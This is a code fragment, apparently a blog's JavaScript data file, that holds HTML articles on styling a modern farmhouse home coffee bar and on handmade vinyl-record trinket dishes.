+               <p>A dedicated coffee bar can turn an ordinary corner of the kitchen or dining area into one of the most loved spots in the home. With open shelves, glass storage jars, black furniture, warm wood tones, trailing plants, and cozy coffee-themed signs, this setup blends function with personality. It is practical enough for daily use, yet stylish enough to feel like a small home cafe.</p>
+
+<p>This type of coffee station is especially appealing because it makes the morning routine feel intentional. Everything has a place: coffee beans, sugar, mugs, machines, baskets, and decor. The combination of greenery, rustic accents, and sleek black finishes creates a modern farmhouse coffee bar that feels warm, organized, and full of charm.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:24px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Key Takeaways</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li>A home coffee bar creates a convenient, beautiful station for daily coffee routines.</li>
+    <li>Open shelves make coffee supplies easy to access while doubling as decorative display space.</li>
+    <li>Glass jars with wooden lids keep beans, grounds, sugar, and creamers organized in a stylish way.</li>
+    <li>Plants, woven baskets, and wood accents soften the look of black furniture and appliances.</li>
+    <li>Coffee-themed wall art adds personality and helps define the station as a cozy cafe-inspired corner.</li>
+  </ul>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Why a Home Coffee Bar Is Worth Creating</h2>
+
+<p>A home coffee bar is more than a place to plug in a coffee maker. It is a small daily luxury that brings order, comfort, and style into the rhythm of everyday life. Instead of searching through cabinets for mugs, coffee pods, filters, sweeteners, and spoons, everything is gathered in one attractive, easy-to-use area.</p>
+
+<p>The best coffee bar ideas are both practical and personal. They make room for the essentials while leaving space for decorative touches that reflect your taste. In this setup, the black cabinet provides storage and structure, the wood countertop adds warmth, and the open shelves create a cafe-style display.</p>
+
+<p>For anyone who loves coffee, a dedicated station can make mornings smoother and more enjoyable. It can also become a welcoming spot for guests, especially when mugs, beans, and accessories are arranged in a way that feels inviting.</p>
+
+<p style="background:#f8fafc;border-left:4px solid #2563eb;padding:16px 18px;border-radius:10px;margin:22px 0;color:#1e293b;"><strong>Important:</strong> A great home coffee bar should not only look good in photos. It should work beautifully in real life. Place your most-used items within easy reach, keep the countertop uncluttered, and use shelves or drawers to separate daily essentials from decorative accents.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Choosing the Right Furniture for a Coffee Station</h2>
+
+<p>The base of a coffee bar matters because it determines how functional the entire setup will be. A cabinet, console table, sideboard, buffet, or kitchen cart can all work, but the best option is one that offers both surface space and storage.</p>
+
+<p>A black cabinet with a wood countertop is a strong choice for a modern farmhouse coffee bar. The dark finish grounds the space, while the wood top keeps it from feeling too heavy. Brass or antique-style drawer pulls add a warm metallic detail that complements the rustic elements.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Look for Drawers and Open Storage</h3>
+
+<p>Drawers are ideal for storing small coffee accessories that can easily clutter the counter. Spoons, filters, napkins, tea bags, stirrers, extra pods, and measuring scoops can all be tucked away but still remain close at hand.</p>
+
+<p>Open lower shelves are useful for mugs, baskets, trays, and wooden crates. They provide easy access while keeping the overall design casual and homey. A woven basket can hide less attractive supplies, while a wooden box can reinforce the rustic coffee bar look.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Make Sure the Surface Is Practical</h3>
+
+<p>The countertop should be large enough for your main coffee equipment. A drip coffee maker, espresso machine, grinder, or milk frother all need stable space. If you use more than one appliance, leave a bit of breathing room between them so the station does not feel crowded.</p>
+
+<p>A wood surface is beautiful, but it should be protected from spills. A small tray, washable mat, or coaster under frequently used items can help preserve the finish and make cleanup easier.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Open Shelving for Style and Storage</h2>
+
+<p>Open shelving is one of the defining features of a stylish coffee bar. It creates vertical storage, which is especially useful when the coffee station is placed in a small corner. Shelves keep everyday supplies accessible while also giving you a place to add decor, greenery, and framed signs.</p>
+
+<p>Black shelves with wood brackets create a balanced look. The dark shelf surface ties into the cabinet and appliances, while the wood brackets echo the countertop and floor. This repetition makes the whole coffee station feel cohesive rather than pieced together.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Use Glass Jars for Coffee Bar Organization</h3>
+
+<p>Clear glass jars are both beautiful and practical. They let you see what you have at a glance, which makes refilling easier. Coffee beans, ground coffee, sugar, cocoa powder, creamer powder, cinnamon sticks, tea bags, and cookies can all be stored in jars depending on your daily habits.</p>
+
+<p>Wooden lids add warmth and keep the jars from looking too modern or clinical. When several jars are lined up together, they create a clean, organized visual rhythm across the shelf.</p>
+
+<p style="background:#fff7ed;border:1px solid #fed7aa;padding:16px 18px;border-radius:10px;margin:22px 0;color:#9a3412;"><strong>Pro Tip:</strong> For a polished coffee bar setup, use matching jars for your main ingredients and label them subtly. This keeps the shelf looking intentional while helping everyone in the house find what they need quickly.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Decorate the Top Shelf with Personality</h3>
+
+<p>The top shelf is a perfect place for coffee-themed wall art, potted plants, trailing greenery, and decorative baskets. A framed sign with a playful coffee quote can instantly set the mood and make the station feel personal.</p>
+
+<p>Because the top shelf is higher, it works best for items that do not need to be handled constantly. Plants, art, and decorative containers are better choices than supplies you reach for every morning.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Balancing Black Furniture with Natural Texture</h2>
+
+<p>Black furniture and appliances can look sleek, dramatic, and modern. However, too much black can feel heavy if it is not balanced with softer materials. This coffee bar works because the darker elements are paired with wood, woven textures, plants, cream walls, and warm brass hardware.</p>
+
+<p>The contrast is what makes the design visually interesting. The black coffee maker and espresso machine feel intentional because they coordinate with the black cabinet and shelves. The wood countertop, baskets, and natural flooring prevent the area from looking stark.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Add Woven Baskets for Warmth</h3>
+
+<p>Woven baskets are a natural fit for a farmhouse coffee bar. They add texture, hide clutter, and soften the clean lines of shelves and cabinetry. A basket can hold extra mugs, packets, napkins, filters, or seasonal supplies.</p>
+
+<p>Rattan, seagrass, water hyacinth, and wicker all work beautifully in this kind of setup. Their natural tones pair well with wood and greenery, creating a relaxed cafe-inspired feeling.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Use Brass Hardware for a Warm Accent</h3>
+
+<p>Brass cup pulls or antique gold handles bring a subtle vintage touch to a black cabinet. They add just enough shine without making the space feel overly formal. This small detail helps bridge the gap between rustic decor and modern design.</p>
+
+<p>If your existing furniture has plain hardware, swapping the handles is one of the easiest ways to update the piece and make it feel custom.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:28px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Expert Insight</h3>
+  <p style="margin:0;color:#334155;">The most inviting coffee bar designs combine convenience with atmosphere. Think about how the station feels during your morning routine: easy access to supplies, enough counter space for preparation, warm lighting nearby, and decorative details that make the first cup of the day feel special.</p>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Bringing Greenery into a Coffee Bar Corner</h2>
+
+<p>Plants are one of the most effective ways to make a coffee station feel fresh and welcoming. In this style of coffee bar, greenery appears on shelves, in hanging planters, on the countertop, and beside the cabinet. The result is a lively corner that feels connected to nature.</p>
+
+<p>Trailing plants soften the shelves and add movement. Upright plants in clay or ceramic pots bring height and structure. A hanging macrame planter adds texture and helps fill vertical space without taking up surface area.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Best Plant Styles for a Coffee Bar</h3>
+
+<p>Choose plants that match the light conditions near your coffee station. If the area is close to a window, many houseplants will thrive. If it is in a dimmer corner, select low-light options or use realistic faux plants for the same visual effect.</p>
+
+<ul>
+  <li><strong>Pothos:</strong> Great for trailing from shelves or hanging planters.</li>
+  <li><strong>Ferns:</strong> Soft and full, ideal for baskets or shelf displays.</li>
+  <li><strong>Peace lilies:</strong> Elegant leaves that look beautiful in simple pots.</li>
+  <li><strong>Snake plants:</strong> Upright and sculptural, perfect for nearby floor planters.</li>
+  <li><strong>Philodendrons:</strong> Easygoing plants with lush, decorative foliage.</li>
+</ul>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Why Plants Make the Space Feel Complete</h3>
+
+<p>Greenery breaks up the strong lines of furniture and shelving. It also adds color without introducing a busy palette. In a coffee bar with black, wood, cream, and glass, green plants provide just the right amount of freshness.</p>
+
+<p style="background:#f8fafc;border-left:4px solid #2563eb;padding:16px 18px;border-radius:10px;margin:22px 0;color:#1e293b;"><strong>Important:</strong> Plants should enhance the coffee station, not interfere with it. Keep trailing vines away from hot appliances, cords, and water areas. Place plants where they add softness while keeping the workspace safe and functional.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Coffee Bar Wall Decor That Adds Charm</h2>
+
+<p>Wall decor helps turn a simple appliance station into a true coffee nook. Framed coffee signs, typography prints, small botanical illustrations, or cafe-inspired artwork all work well. The goal is to make the area feel intentional and enjoyable.</p>
+
+<p>Coffee quote signs are especially popular because they add humor and personality. A phrase like “Coffee: Because Adulting Is Hard” brings a playful touch, while a “Good Coffee Good Day” print adds a positive, morning-friendly mood.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Choose Simple Frames for a Clean Look</h3>
+
+<p>Black or dark wood frames coordinate nicely with black shelving and furniture. They help the wall art feel connected to the overall design. For a softer look, you could also use natural wood frames, especially if your coffee bar leans more rustic than modern.</p>
+
+<p>Keep the artwork simple. Since the shelves already hold jars, plants, and equipment, overly busy wall art can make the space feel crowded. Typography prints and minimal line drawings are usually a safe choice.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Use Vertical Decor to Fill the Corner</h3>
+
+<p>A hanging macrame planter is a clever way to decorate the wall beside the coffee station. It fills an empty vertical area, adds texture, and supports the cozy boho farmhouse style. This is especially useful in small spaces where floor space is limited.</p>
+
+<p>Other vertical decor options include narrow wall racks, mug rails, small pegboards, hanging baskets, or slim art groupings.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">How to Organize Coffee Supplies Beautifully</h2>
+
+<p>A coffee bar can become cluttered quickly if there is no system. Between mugs, beans, filters, pods, syrups, spoons, napkins, and machines, even a stylish setup can feel messy without proper organization.</p>
+
+<p>The key is to divide items by use. Daily essentials should be easiest to reach. Occasional items can go in baskets, drawers, or lower shelves. Decorative items should enhance the station without blocking function.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Keep Daily Items at Counter Level</h3>
+
+<p>Your coffee maker or espresso machine should sit on the main surface. Nearby, keep your favorite mug, a small spoon rest, and perhaps a jar of sugar or beans. If you use syrups or milk frothers daily, place them on a tray so they look grouped rather than scattered.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Store Bulk Ingredients on Shelves</h3>
+
+<p>Glass jars are ideal for bulk ingredients because they are visually attractive. They also reduce packaging clutter. Matching containers make even simple pantry items look decorative.</p>
+
+<h4 style="font-size:20px;line-height:1.4;margin:22px 0 12px;color:#334155;font-weight:700;background:#f8fafc;padding:10px 14px;border-radius:8px;">Coffee Bar Essentials to Include</h4>
+
+<ul>
+  <li>Coffee beans or ground coffee</li>
+  <li>Tea bags or hot cocoa packets</li>
+  <li>Sugar, sweeteners, or flavored syrups</li>
+  <li>Coffee filters or pods</li>
+  <li>Mugs and travel cups</li>
+  <li>Spoons, stir sticks, and napkins</li>
+  <li>Milk frother or small accessories</li>
+  <li>Small tray for daily-use items</li>
+</ul>
+
+<p style="background:#fff7ed;border:1px solid #fed7aa;padding:16px 18px;border-radius:10px;margin:22px 0;color:#9a3412;"><strong>Pro Tip:</strong> If your coffee station is visible from the main living area, decant packaging whenever possible. Bags, boxes, and labels can make the space look busy, while jars, baskets, and trays create a cleaner, more styled appearance.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Small Space Coffee Bar Ideas</h2>
+
+<p>This coffee bar setup is a great example of how to make a compact corner feel useful and stylish. By using vertical shelving, lower cabinet storage, and wall-mounted decor, the space works harder without feeling crowded.</p>
+
+<p>Even if you do not have a large kitchen, you can recreate the feeling with a narrow console table, a rolling cart, a small cabinet, or a section of countertop. The most important thing is to define the area clearly so it feels like a dedicated station.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Use Height Instead of Width</h3>
+
+<p>When floor space is limited, wall shelves are your best friend. They allow you to store jars, mugs, plants, and decor above the coffee maker rather than spreading everything across the counter.</p>
+
+<p>Keep heavier items lower and lighter decorative pieces higher. This not only looks balanced, but it is also safer and easier to use.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Let Light Make the Corner Feel Bigger</h3>
+
+<p>A coffee bar near a window has an immediate advantage. Natural light makes the space feel cheerful and highlights plants, glass jars, and warm wood surfaces. Bamboo or woven shades can add privacy while reinforcing the natural texture of the design.</p>
+
+<p>If your coffee station is not near a window, consider adding a small wall sconce, under-shelf light, or warm lamp nearby to create a cozy cafe glow.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">How to Recreate This Modern Farmhouse Coffee Bar</h2>
+
+<p>To recreate this look, focus on five main ingredients: a dark furniture base, open shelves, organized jars, natural textures, and greenery. These elements work together to create a coffee bar that feels stylish but still approachable.</p>
+
+<ol>
+  <li><strong>Choose a cabinet or console:</strong> Look for storage, a sturdy top, and a finish that complements your kitchen or dining area.</li>
+  <li><strong>Add open shelves:</strong> Install one or two shelves above the station for jars, art, and plants.</li>
+  <li><strong>Decant supplies:</strong> Use matching glass jars for coffee beans, sugar, cocoa, and other ingredients.</li>
+  <li><strong>Layer decor:</strong> Add framed coffee signs, baskets, a tray, and warm hardware.</li>
+  <li><strong>Finish with plants:</strong> Use a mix of trailing, potted, and hanging greenery to soften the look.</li>
+</ol>
+
+<p>The final result should feel both organized and inviting. Avoid overfilling the shelves, and leave enough surface space to actually prepare coffee comfortably.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:30px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">At a Glance</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li>Use a black cabinet or sideboard for a bold, grounded foundation.</li>
+    <li>Install shelves to maximize vertical storage and display space.</li>
+    <li>Store coffee ingredients in matching jars for a clean, organized look.</li>
+    <li>Add plants and woven textures to soften dark finishes.</li>
+    <li>Use framed coffee signs to create a playful cafe-inspired mood.</li>
+  </ul>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Conclusion: Create a Coffee Corner You Love Using Every Day</h2>
+
+<p>A well-designed home coffee bar brings beauty and convenience together in one compact space. With the right mix of storage, shelving, appliances, jars, plants, and decor, a simple corner can become a cozy daily destination. It is the kind of home feature that feels small at first, but quickly becomes part of the morning rhythm.</p>
+
+<p>The appeal of this modern farmhouse coffee bar comes from its balance. The black cabinet and appliances feel bold and practical, while the wood surface, woven baskets, glass jars, and greenery add warmth. Coffee-themed signs give the space personality, and the open shelves make everything feel organized and intentional.</p>
+
+<p>Whether you have a full wall, a kitchen nook, or a small unused corner, you can create a coffee station that suits your routine and style. Start with function, add texture, keep the essentials easy to reach, and finish with details that make you smile before the first sip. The result is a home coffee bar that feels welcoming, useful, and beautifully personal.</p>
+
+<div style="margin-top:28px;">
+  <h3 style="margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Tags</h3>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Home Coffee Bar</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Coffee Station Ideas</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Modern Farmhouse Decor</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Kitchen Coffee Nook</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Open Shelf Styling</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Coffee Bar Organization</span>
+  <span style="display:inline-block;background:#eef2f7;color:#1f2937;padding:6px 10px;border-radius:999px;margin:4px 6px 0 0;font-size:13px;">Cozy Kitchen Decor</span>
+</div>
+
+               `
+            },
+            {
+                id: 'DIY-Hand-Painted-Heart-Shaped',
+                title: 'DIY Hand Painted Heart Shaped Vinyl Record Lana Del Rey Room Decor Aesthetic',
+                date: 'April 18, 2026',
+                // 👇 Change this to point to your local assets folder
+                image: './assets/DIY-Hand-Painted-Heart-Shaped.jpg',
+                excerpt: 'Transform your space into a personal sanctuary with these aesthetic wall decor ideas! From hand-painted vinyl records featuring your favorite Lana Del Rey lyrics to custom heart-shaped art, there are endless ways to show off your unique style.',
+                content : `
+                <p>Handmade trinket dishes have a special way of turning tiny everyday objects into something memorable. A pair of glossy record-inspired dishes, one shaped like a heart and one in a classic round vinyl form, instantly brings together music, nostalgia, romance, and handmade charm. With their black grooved surfaces, playful center labels, and small dish-like form, they feel like the kind of decorative accent that belongs on a bedside table, vanity, desk, or creative studio shelf.</p>
+
+<p>This style of decor is more than cute. It is personal, expressive, and practical. A small ceramic dish can hold rings, earrings, keys, coins, paper clips, guitar picks, or other little treasures while also adding personality to a room. The vinyl record theme gives it a retro feel, while the handmade finish makes every detail feel warm and unique.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:24px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Key Takeaways</h3>
+  <ul style="margin:0;padding-left:20px;">
+    <li>Vinyl record trinket dishes combine retro music style with useful everyday storage.</li>
+    <li>A heart-shaped dish adds a romantic, giftable twist to the classic record design.</li>
+    <li>Glossy black finishes, hand-drawn grooves, and custom labels make these pieces feel artistic and personal.</li>
+    <li>Small ceramic dishes are perfect for organizing jewelry, keys, coins, and keepsakes.</li>
+    <li>This type of handmade decor works beautifully for music lovers, creative spaces, bedrooms, vanities, and gift boxes.</li>
+  </ul>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">Why Vinyl Record Trinket Dishes Are So Charming</h2>
+
+<p>Vinyl records already carry a strong emotional pull. They suggest favorite songs, old playlists, slow afternoons, personal memories, and the warmth of analog sound. When that familiar shape is reimagined as a small decorative dish, it becomes both nostalgic and functional.</p>
+
+<p>The charm comes from the contrast. A record is usually flat, musical, and meant for listening. A trinket dish is small, practical, and meant for holding keepsakes. Combining the two creates an object that feels clever, sentimental, and instantly eye-catching.</p>
+
+<p>The handmade quality adds even more appeal. The uneven painted grooves, glossy black surface, handwritten-style labels, and playful phrases make the dishes feel personal rather than mass-produced. They look like little art pieces, but they still serve a purpose.</p>
+
+<p style="background:#f8fafc;border-left:4px solid #2563eb;padding:16px 18px;border-radius:10px;margin:22px 0;color:#1e293b;"><strong>Important:</strong> The best handmade trinket dishes balance beauty and usefulness. They should be decorative enough to display, but practical enough to use every day for jewelry, keys, coins, or tiny keepsakes that deserve a special place.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">A Perfect Decor Piece for Music Lovers</h2>
+
+<p>Music-themed decor can sometimes feel too bold or too literal, but a small vinyl record dish offers a subtle way to celebrate a love of songs, albums, and personal soundtracks. It can sit on a nightstand, dresser, shelf, or desk without overpowering the space.</p>
+
+<p>The black record shape is instantly recognizable, while the center labels provide room for personality. Phrases like “All the feels” and “Make your own melody” turn the dishes into little mood pieces. They feel thoughtful, upbeat, and slightly sentimental.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">The Nostalgia of Vinyl-Inspired Design</h3>
+
+<p>Vinyl-inspired home accents appeal to people who love vintage style, creative decor, and objects that tell a story. Even for those who do not collect records, the look of a vinyl disc feels familiar and emotionally rich. It brings to mind album art, record players, favorite bands, and the joy of choosing music with intention.</p>
+
+<p>A record trinket dish captures that feeling in a small, decorative format. It is not just storage. It is a tiny celebration of music as part of daily life.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">A Sweet Gift for Creative People</h3>
+
+<p>These dishes make especially thoughtful gifts because they feel personal without requiring a specific size, color preference, or complicated setup. They are easy to use, easy to display, and easy to connect with emotionally.</p>
+
+<p>A music lover might use one for guitar picks or rings. An artist might place one near a worktable for small supplies. A romantic partner might keep jewelry in the heart-shaped dish. A teenager or college student might use one to decorate a desk or dorm room. The design is playful enough to feel fun and stylish enough to feel grown-up.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">The Beauty of the Heart-Shaped Record Dish</h2>
+
+<p>The heart-shaped vinyl dish brings a romantic twist to the record theme. Instead of simply copying the round shape of a traditional record, it transforms the idea into something softer and more expressive. The black glossy surface keeps the vinyl reference clear, while the heart silhouette makes it feel affectionate and gift-ready.</p>
+
+<p>The pink center label adds a charming contrast against the black. It gives the dish a sweet, handcrafted personality and makes the phrase “All the feels” feel even more fitting. Small doodles, hearts, and hand-lettered details enhance the emotional tone.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Why the Heart Shape Works</h3>
+
+<p>The heart shape immediately suggests affection, memory, and sentiment. When combined with the idea of a record, it feels like a visual love song. This makes the dish ideal for Valentine’s Day, anniversaries, birthdays, bridal gifts, or simple “thinking of you” presents.</p>
+
+<p>It also works beautifully as bedroom decor. Placed beside a bed or on a vanity, the heart-shaped dish can hold rings, earrings, lip balm, or tiny keepsakes while adding a soft romantic detail to the room.</p>
+
+<p style="background:#fff7ed;border:1px solid #fed7aa;padding:16px 18px;border-radius:10px;margin:22px 0;color:#9a3412;"><strong>Pro Tip:</strong> For a memorable gift, pair a heart-shaped vinyl trinket dish with a small piece of jewelry, a handwritten note, or a playlist inspired by the message on the dish. The combination feels personal, creative, and easy to customize.</p>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">The Classic Round Record Dish</h2>
+
+<p>The round dish stays closer to the familiar vinyl record shape. Its circular form, black grooved surface, and center label immediately create the impression of a miniature record. The phrase “Make Your Own Melody” gives it an uplifting message that works well for a desk, studio, or creative corner.</p>
+
+<p>This style feels slightly more classic and versatile than the heart-shaped version. It can suit many spaces, from a music room to an entryway table. Because the round form is simple, it also pairs easily with other decorative dishes, candles, books, plants, and art supplies.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">A Motivational Accent for Creative Spaces</h3>
+
+<p>The message “Make Your Own Melody” is especially fitting for creative areas. It encourages originality and self-expression, which makes the dish feel right at home near sketchbooks, paintbrushes, journals, instruments, or craft supplies.</p>
+
+<p>Placed on a desk, it can hold paper clips, rings, pins, beads, or other small objects. In a studio, it can become a catchall for tiny tools or inspiration pieces. Its design supports both organization and creativity.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">A Small Piece with Big Personality</h3>
+
+<p>Small decor pieces often make the biggest difference because they add detail where a room might otherwise feel plain. A miniature vinyl dish can turn a simple tabletop into a styled vignette. It is the kind of item people notice because it feels unexpected.</p>
+
+<p>The glossy finish catches light, the grooves create movement, and the center label draws the eye. Even when empty, the dish looks intentional and decorative.</p>
+
+<div style="background:#f8fafc;border:1px solid #dbe4ee;border-radius:12px;padding:18px 20px;margin:28px 0;">
+  <h3 style="margin-top:0;margin-bottom:12px;font-size:24px;line-height:1.4;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Expert Insight</h3>
+  <p style="margin:0;color:#334155;">Tiny decor pieces are most effective when they connect to a larger theme. A vinyl record dish works beautifully in rooms with music posters, vintage books, plants, candles, art tools, or retro accessories because it reinforces personality without taking over the entire design.</p>
+</div>
+
+<h2 style="font-size:30px;line-height:1.3;margin:36px 0 18px;color:#0f172a;border-bottom:2px solid #e2e8f0;padding-bottom:10px;font-weight:700;">How to Use a Vinyl Record Trinket Dish</h2>
+
+<p>A trinket dish is one of the most versatile small accessories you can own. It keeps little things from getting lost and makes ordinary storage look intentional. Because these dishes are compact, they can be used in many different places around the home.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">On a Bedside Table</h3>
+
+<p>A record trinket dish on a nightstand is perfect for rings, earrings, hair clips, lip balm, or small keepsakes. Instead of scattering items on the surface, the dish keeps everything collected in one easy-to-find spot.</p>
+
+<p>The heart-shaped version works especially well here because it brings a soft, cozy mood to the bedside area. Add a small lamp, a book, and a plant nearby for a simple but charming nightstand arrangement.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">On a Vanity or Dresser</h3>
+
+<p>On a vanity, these dishes are ideal for everyday jewelry. Place your favorite earrings, rings, or necklace in the dish at the end of the day. This keeps delicate pieces safe and makes the vanity feel more styled.</p>
+
+<p>The glossy black surface contrasts beautifully with gold, silver, and gemstone jewelry. A nearby pink dish, ceramic tray, or small mirror can create a coordinated display.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">On a Desk or Creative Table</h3>
+
+<p>For artists, students, writers, or crafters, a small trinket dish can hold paper clips, push pins, washi tape bits, beads, charms, or tiny tools. The music-inspired design adds a playful creative energy to the workspace.</p>
+
+<p>It also looks beautiful beside paintbrushes, sketchbooks, fabric swatches, and palettes. The handmade look fits naturally into creative environments because it feels artistic rather than overly polished.</p>
+
+<h3 style="font-size:24px;line-height:1.4;margin:28px 0 14px;color:#1e293b;font-weight:700;padding-left:12px;border-left:4px solid #cbd5e1;">Near the Entryway</h3>
+
+<p>A round record dish can become a stylish landing spot for keys, coins, and small everyday items near the front door. This is especially useful for people who like practical decor. Instead of using a plain bowl, the record-inspired design adds personality to the entry table.</p>
+
+<p>Pair it with a small plant, a candle, or a framed print for a welcoming vignette.</p>
+
